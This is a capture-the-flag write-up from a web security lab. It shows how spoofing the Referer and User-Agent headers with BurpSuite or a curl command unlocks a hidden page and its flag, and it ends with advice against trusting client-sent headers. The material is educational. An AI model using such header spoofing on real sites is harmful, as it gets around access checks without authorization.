# Breach: Spoof

## Explanation:


#### Step 1:

- Goto the albatroz page (at the bottom of the home page, by clicking on the copyright notice).


#### Step 2:

- View the source code of the page.

> You will find 2 interesting comments :
> ```html
> <!-- You must come from : "https://www.nsa.gov/". -->
> ```
> ```html
> <!-- Let's use this browser : "ft_bornToSec". It will help you a lot. -->
> ```


#### Step 3:

We need to send the request with the correct headers :
- `Referer` must be `https://www.nsa.gov/`.
- `User-Agent` must be `ft_bornToSec`.

There are 2 ways to do it:


#### [[ With BurpSuite ]] :


#### Step 3.a:

- Open BurpSuite, refresh and intercept the HTTP request.


#### Step 3.b:

- Update the headers :
```http
Referer: https://www.nsa.gov/
User-Agent: ft_bornToSec
```


#### Step 3.c:

- Forward the request and look at the browser.


<br>


##### [[ With curl ]] :


#### Step 3.a:

- The URL of the albatroz page is `http://$IP/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`.

- Use the following command:
```bash
curl -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" http://$IP/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f > response.html
```


#### Step 3.b:

- Find the flag in the `response.html` file.<br>
  You can either:

  - Open the file with a browser.
    ```bash
    open response.html
    ```
    ```bash
    firefox response.html
    ```
    ```bash
    google-chrome response.html
    ```

  - Or grep it:
    ```bash
    grep flag response.html
    ```


<br>


## How to fix it:

> The data inside the requests are user-side and can be edited by the user at any moment.<br>
> Making some pages accessible depending on the `User-Agent` is stupid.<br>
> It's not because the `User-Agent` is `Mozilla` that the user does not use another browser.

##### RULE NÂ°1 IN SECURITY: NEVER TRUST THE USER !

- Do not base sensitive things on the content of a simple request.
